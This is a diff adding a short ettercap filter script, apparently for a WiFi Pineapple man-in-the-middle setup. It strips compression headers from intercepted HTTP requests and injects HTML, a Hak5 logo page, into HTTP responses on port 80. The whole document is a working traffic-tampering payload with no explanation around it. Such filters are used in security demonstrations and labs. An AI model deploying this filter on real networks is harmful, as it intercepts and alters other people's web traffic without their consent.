@@ -1,0 +1,17 @@
+if (ip.proto == TCP && tcp.dst == 80) {  
+   if (search(DATA.data, "Accept-Encoding")) {  
+      replace("Accept-Encoding", "Accept-Rubbish!");   
+   }  
+   if (search(DATA.data, "gzip")) {  
+    replace("gzip", "  ");  
+   }  
+ }  
+ if (ip.proto == TCP && tcp.src == 80) {  
+   replace("<title>", "<title>WiFi Pineapple<\/title><body><p><img src="https://hak5.org/images/logo/Hak5--727x346.png"></p></body>");  
+   replace("<TITLE>", "<title>WiFi Pineapple<\/title><body><p><img src="https://hak5.org/images/logo/Hak5--727x346.png"></p></body>");  
+   replace("</title>", " ");  
+   replace("</TITLE>", " ");  
+   replace("<body>", " ");  
+   replace("<BODY>", " ");  
+   msg("Filter Ran.\n");  
+ }
